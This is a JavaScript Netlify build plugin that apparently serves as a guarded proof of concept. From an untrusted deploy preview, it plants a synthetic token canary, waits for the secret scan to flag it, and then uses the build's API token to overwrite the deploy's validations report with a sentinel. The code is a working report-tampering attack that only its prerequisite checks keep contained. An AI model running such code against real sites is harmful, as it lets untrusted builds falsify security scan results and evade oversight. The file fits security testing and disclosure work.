import { unlinkSync, writeFileSync } from 'node:fs'
import { relative, resolve } from 'node:path'

const EXPECTED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
const CANARY_PREFIX = '__synthetic_validation_report_canary_'
const SYNTHETIC_SECRET_KEY = 'NETLIFY_VALIDATION_REPORT_SYNTHETIC_SECRET'
const SENTINEL_SCANNED_FILE_COUNT = 424242
const REPORT_POLL_DEADLINE_MS = 5_000

const getCanaryFile = (deployId) => `${CANARY_PREFIX}${deployId}.txt`

const isInside = (parent, child) => {
  const pathFromParent = relative(parent, child)
  return pathFromParent === '' || (!pathFromParent.startsWith('..') && !pathFromParent.startsWith('/'))
}

const makeSyntheticLikelySecret = () =>
  ['gh', 'p_', '7Fq9Lm2Np4Rs6Tu8Vw0Xy1Za3Bc5De7Fg9Hi2Jk4Mn6Pq8Rs'].join('')

const normalizeApiBase = (value) =>
  /^https?:\/\//i.test(value || '') ? value : `https://${value || 'api.netlify.com'}`

const getSecretScan = (body) => {
  const report = body?.deploy_validations_report ?? body
  return report?.secrets_scan ?? report?.secret_scan_result
}

const summarizeReport = (body) => {
  const scan = getSecretScan(body)
  return {
    present: scan !== null && typeof scan === 'object',
    scannedFilesCount: Number.isInteger(scan?.scannedFilesCount)
      ? scan.scannedFilesCount
      : null,
    secretsScanMatchCount: Array.isArray(scan?.secretsScanMatches)
      ? scan.secretsScanMatches.length
      : null,
    enhancedSecretsScanMatchCount: Array.isArray(scan?.enhancedSecretsScanMatches)
      ? scan.enhancedSecretsScanMatches.length
      : null,
  }
}

const readSitePolicy = async ({ apiBase, token }) => {
  try {
    const response = await fetch(new URL(`/api/v1/sites/${EXPECTED_SITE_ID}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(1_500),
    })
    const body = response.ok ? await response.json() : null
    return {
      status: response.status,
      untrustedFlow: body?.build_settings?.untrusted_flow || null,
      publicRepo: body?.build_settings?.public_repo === true,
    }
  } catch (error) {
    return { requestFailed: true, errorClass: error?.constructor?.name || 'Error' }
  }
}

const fetchDeployReport = async ({ apiBase, deployId, token }) => {
  try {
    const response = await fetch(new URL(`/api/v1/deploys/${deployId}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(1_500),
    })
    const body = response.ok ? await response.json() : null
    return {
      status: response.status,
      ok: response.ok,
      body,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
    }
  }
}

const summarizeDeployRead = (read) => ({
  status: read?.status ?? null,
  ok: read?.ok === true,
  report: summarizeReport(read?.body),
  responseBodyRetained: false,
})

const readDeployReport = async (context) => summarizeDeployRead(await fetchDeployReport(context))

const waitForPositiveReport = async ({ apiBase, deployId, token }) => {
  const canaryFile = getCanaryFile(deployId)
  const deadline = Date.now() + REPORT_POLL_DEADLINE_MS
  let latest = null
  let attempt = 0
  while (Date.now() < deadline) {
    attempt += 1
    latest = await fetchDeployReport({ apiBase, deployId, token })
    const summary = summarizeDeployRead(latest)
    const normalMatches = summary.report.secretsScanMatchCount || 0
    const enhancedMatches = summary.report.enhancedSecretsScanMatchCount || 0
    const scan = getSecretScan(latest?.body)
    const allMatches = [
      ...(Array.isArray(scan?.secretsScanMatches) ? scan.secretsScanMatches : []),
      ...(Array.isArray(scan?.enhancedSecretsScanMatches) ? scan.enhancedSecretsScanMatches : []),
    ]
    const canaryMatchObserved = allMatches.some(
      (match) =>
        typeof match?.file === 'string' &&
        (match.file === canaryFile || match.file.endsWith(`/${canaryFile}`)) &&
        match.key === SYNTHETIC_SECRET_KEY,
    )
    if (latest?.ok && normalMatches + enhancedMatches > 0 && scan && canaryMatchObserved) {
      return {
        evidence: {
          observed: true,
          canaryMatchObserved: true,
          syntheticSecretKeyMatched: true,
          attempt,
          read: summary,
        },
        sourceScan: scan,
      }
    }
    await new Promise((resolveDelay) => setTimeout(resolveDelay, 250))
  }
  return {
    evidence: {
      observed: false,
      canaryMatchObserved: false,
      syntheticSecretKeyMatched: false,
      attempt,
      read: summarizeDeployRead(latest),
    },
    sourceScan: null,
  }
}

const waitForSentinelReport = async (context) => {
  const deadline = Date.now() + REPORT_POLL_DEADLINE_MS
  let latest = null
  let attempt = 0
  while (Date.now() < deadline) {
    attempt += 1
    latest = await readDeployReport(context)
    if (latest?.report?.scannedFilesCount === SENTINEL_SCANNED_FILE_COUNT) {
      return { observed: true, attempt, read: latest }
    }
    await new Promise((resolveDelay) => setTimeout(resolveDelay, 250))
  }
  return { observed: false, attempt, read: latest }
}

const overwriteWithSentinelReport = async ({ apiBase, deployId, sourceScan, token }) => {
  try {
    const response = await fetch(
      new URL(`/api/v1/deploys/${deployId}/validations_report`, apiBase),
      {
        method: 'PATCH',
        headers: {
          authorization: `Bearer ${token}`,
          'content-type': 'application/json',
        },
        body: JSON.stringify({
          secrets_scan: {
            scannedFilesCount: SENTINEL_SCANNED_FILE_COUNT,
            secretsScanMatches: sourceScan.secretsScanMatches,
            enhancedSecretsScanMatches: sourceScan.enhancedSecretsScanMatches,
          },
        }),
        redirect: 'error',
        signal: AbortSignal.timeout(5_000),
      },
    )
    const body = response.ok ? await response.json() : null
    return {
      status: response.status,
      ok: response.ok,
      deployIdMatches: body?.deploy_id === deployId,
      report: summarizeReport(body),
      responseBodyRetained: false,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRetained: false,
    }
  }
}

const getContext = async (constants) => {
  const token = constants.NETLIFY_API_TOKEN
  const apiBase = normalizeApiBase(constants.NETLIFY_API_HOST)
  const deployId = process.env.DEPLOY_ID || ''
  const publishDir = resolve(constants.PUBLISH_DIR || '')
  const canaryPath = resolve(process.cwd(), getCanaryFile(deployId))
  const canaryInsidePublishDirectory = isInside(publishDir, canaryPath)
  const syntheticSecretExposedToBuild =
    typeof process.env[SYNTHETIC_SECRET_KEY] === 'string' &&
    process.env[SYNTHETIC_SECRET_KEY].length > 0
  const syntheticSecretMatchesCanary =
    syntheticSecretExposedToBuild &&
    process.env[SYNTHETIC_SECRET_KEY] === makeSyntheticLikelySecret()
  const policy = typeof token === 'string' && token.length > 0
    ? await readSitePolicy({ apiBase, token })
    : null
  const prerequisites = {
    deployPreview: process.env.CONTEXT === 'deploy-preview',
    controlledReview: process.env.REVIEW_ID === '1',
    controlledSite: constants.SITE_ID === EXPECTED_SITE_ID,
    deployIdPresent: /^[0-9a-f]{24}$/.test(deployId),
    tokenPresent: typeof token === 'string' && token.length > 0,
    redactedPolicy: policy?.untrustedFlow === 'redact',
    publicRepository: policy?.publicRepo === true,
    canaryOutsidePublishDirectory: !canaryInsidePublishDirectory,
    syntheticSecretMatchesCanary,
  }
  return {
    apiBase,
    canaryInsidePublishDirectory,
    canaryPath,
    deployId,
    policy,
    prerequisites,
    syntheticSecretExposedToBuild,
    token,
  }
}

const removeCanary = (phase) => {
  const deployId = process.env.DEPLOY_ID || ''
  const ownerBoundPath = /^[0-9a-f]{24}$/.test(deployId)
  const canaryPath = ownerBoundPath ? resolve(process.cwd(), getCanaryFile(deployId)) : null
  let removed = false
  let cleanupErrorClass = null
  if (canaryPath) {
    try {
      unlinkSync(canaryPath)
      removed = true
    } catch (error) {
      if (error?.code !== 'ENOENT') cleanupErrorClass = error?.constructor?.name || 'Error'
    }
  }
  console.log(
    `NETLIFY_VALIDATION_REPORT_CLEANUP ${JSON.stringify({
      phase,
      ownerBoundPath,
      removed,
      cleanupErrorClass,
    })}`,
  )
}

export const onPostBuild = async ({ constants }) => {
  const context = await getContext(constants)
  const result = {
    schema: 'netlify-untrusted-validation-report-overwrite.v1',
    phase: 'prepare-positive-scan',
    prerequisites: context.prerequisites,
    policy: context.policy,
    syntheticSecretExposedToBuild: context.syntheticSecretExposedToBuild,
    canaryWritten: false,
    canaryInsidePublishDirectory: context.canaryInsidePublishDirectory,
    canaryWriteErrorClass: null,
    syntheticCredentialHasAuthority: false,
    syntheticCredentialLogged: false,
    credentialValuesLogged: false,
    responseBodiesRetained: false,
    mutationAttempted: false,
    syntheticOnly: true,
  }

  if (!Object.values(context.prerequisites).every(Boolean)) {
    console.log(`NETLIFY_VALIDATION_REPORT_OVERWRITE ${JSON.stringify(result)}`)
    return
  }

  let syntheticLikelySecret = makeSyntheticLikelySecret()
  try {
    writeFileSync(context.canaryPath, `credential=${syntheticLikelySecret}\n`, {
      encoding: 'utf8',
      flag: 'wx',
      mode: 0o600,
    })
    result.canaryWritten = true
  } catch (error) {
    result.canaryWriteErrorClass = error?.constructor?.name || 'Error'
    if (error?.code !== 'EEXIST') {
      try {
        unlinkSync(context.canaryPath)
      } catch {}
    }
  } finally {
    syntheticLikelySecret = ''
  }
  console.log(`NETLIFY_VALIDATION_REPORT_OVERWRITE ${JSON.stringify(result)}`)
}

export const onError = async ({ constants }) => {
  const context = await getContext(constants)
  const result = {
    schema: 'netlify-untrusted-validation-report-overwrite.v1',
    phase: 'post-scan-overwrite',
    prerequisites: context.prerequisites,
    policy: context.policy,
    positiveReport: null,
    mutationAttempted: false,
    overwrite: null,
    readback: null,
    sentinelReportObserved: false,
    finalDeployFailureExpected: true,
    credentialValuesLogged: false,
    responseBodiesRetained: false,
    syntheticOnly: true,
  }

  if (!Object.values(context.prerequisites).every(Boolean)) {
    console.log(`NETLIFY_VALIDATION_REPORT_OVERWRITE ${JSON.stringify(result)}`)
    return
  }

  const positiveReport = await waitForPositiveReport(context)
  result.positiveReport = positiveReport.evidence
  if (!positiveReport.evidence.observed) {
    console.log(`NETLIFY_VALIDATION_REPORT_OVERWRITE ${JSON.stringify(result)}`)
    return
  }

  result.mutationAttempted = true
  result.overwrite = await overwriteWithSentinelReport({
    ...context,
    sourceScan: positiveReport.sourceScan,
  })
  result.readback = await waitForSentinelReport(context)
  result.sentinelReportObserved =
    result.overwrite?.ok === true &&
    result.overwrite?.deployIdMatches === true &&
    result.readback?.observed === true &&
    result.readback?.read?.report?.scannedFilesCount === SENTINEL_SCANNED_FILE_COUNT &&
    result.readback?.read?.report?.secretsScanMatchCount ===
      result.positiveReport.read.report.secretsScanMatchCount &&
    result.readback?.read?.report?.enhancedSecretsScanMatchCount ===
      result.positiveReport.read.report.enhancedSecretsScanMatchCount

  console.log(`NETLIFY_VALIDATION_REPORT_OVERWRITE ${JSON.stringify(result)}`)
}

export const onEnd = async () => removeCanary('onEnd')
